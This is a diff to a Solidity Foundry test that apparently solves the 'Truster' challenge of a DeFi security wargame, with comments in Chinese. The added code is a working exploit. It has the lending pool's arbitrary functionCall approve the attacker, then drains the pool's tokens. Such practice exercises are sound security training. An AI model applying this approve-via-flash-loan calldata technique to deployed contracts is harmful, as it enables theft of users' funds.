@@ -41,7 +41,27 @@ contract Truster is Test {
         /**
          * EXPLOIT START *
          */
-
+        // 正常閃電貸借款
+        // 傳入 data 利用 trusterLenderPool's target.functionCall(data) 還錢給 trusterLenderPool
+        vm.startPrank(attacker);
+        bytes memory data = abi.encodeWithSignature(
+            "transferFrom(address,address,uint256)", attacker, address(trusterLenderPool), TOKENS_IN_POOL
+        );
+        dvt.approve(address(trusterLenderPool), TOKENS_IN_POOL);
+        trusterLenderPool.flashLoan(TOKENS_IN_POOL, attacker, address(dvt), data);
+        vm.stopPrank();
+        // 攻擊手法
+        uint256 tokensInPool = dvt.balanceOf(address(trusterLenderPool));
+        // bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(attacker), tokensInPool);
+        data = abi.encodeWithSignature("approve(address,uint256)", address(attacker), tokensInPool);
+        // bytes memory data = abi.encodeWithSignature(
+        //     "flashLoan(uint256,address,address,bytes)", 0, attacker, address(this), new bytes(0x00)
+        // );
+        vm.startPrank(attacker);
+        // 故意先跟 trusterLenderPool 借 0 元，然後利用 data (functionCall 漏洞) ， 將 trusterlenderPoll approve attacker 將錢轉轉給自己。
+        trusterLenderPool.flashLoan(0, attacker, address(dvt), data);
+        dvt.transferFrom(address(trusterLenderPool), attacker, tokensInPool);
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
@@ -54,4 +74,6 @@ contract Truster is Test {
         assertEq(dvt.balanceOf(address(trusterLenderPool)), 0);
         assertEq(dvt.balanceOf(address(attacker)), TOKENS_IN_POOL);
     }
+
+    receive() external payable {}
 }
